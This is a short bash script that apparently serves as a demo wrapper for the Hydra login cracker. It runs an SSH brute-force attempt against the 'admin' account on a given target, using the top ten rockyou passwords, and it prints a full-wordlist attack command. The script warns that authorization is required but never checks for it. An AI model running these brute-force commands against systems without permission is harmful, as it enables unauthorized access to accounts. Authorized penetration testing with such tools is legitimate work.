#!/bin/bash
# =============================================================================
# Hydra - Network Login Cracker
# Brute-force password attacks against network services
# Usage: ./hydra_scan.sh <target>
# =============================================================================

TARGET="${1:-localhost}"

echo "=============================================="
echo "Hydra - Network Login Cracker"
echo "=============================================="
echo "Target: $TARGET"
echo "Timestamp: $(date -Iseconds)"
echo "=============================================="
echo ""

# Check if hydra is installed
if ! command -v hydra &> /dev/null; then
    echo "ERROR: hydra is not installed. Please install it with:"
    echo "  sudo apt-get install hydra"
    exit 1
fi

echo "[!] WARNING: Password cracking requires:"
echo "    - A username list file"
echo "    - A password list file"
echo "    - Explicit authorization"
echo ""
echo "[*] Running demonstration with common defaults..."
echo ""

# Demo: Check SSH with single username and small password list
# In practice, you would use: hydra -L users.txt -P passwords.txt <target> ssh
echo "=== SSH Login Test (demo) ==="
echo "Command example:"
echo "  hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET ssh -t 4"
echo ""

# Check if rockyou is available
if [ -f "/usr/share/wordlists/rockyou.txt" ]; then
    echo "[*] Testing with top 10 common passwords..."
    head -10 /usr/share/wordlists/rockyou.txt > /tmp/top10.txt
    hydra -l admin -P /tmp/top10.txt "$TARGET" ssh -t 4 -f 2>/dev/null || echo "No valid credentials found (expected in demo)"
    rm /tmp/top10.txt
elif [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
    echo "[!] rockyou.txt is compressed. Decompress with:"
    echo "    sudo gunzip /usr/share/wordlists/rockyou.txt.gz"
else
    echo "[!] Password list not found. Install with:"
    echo "    sudo apt-get install wordlists"
fi

echo ""
echo "=============================================="
echo "Hydra demo completed at $(date -Iseconds)"
echo "=============================================="
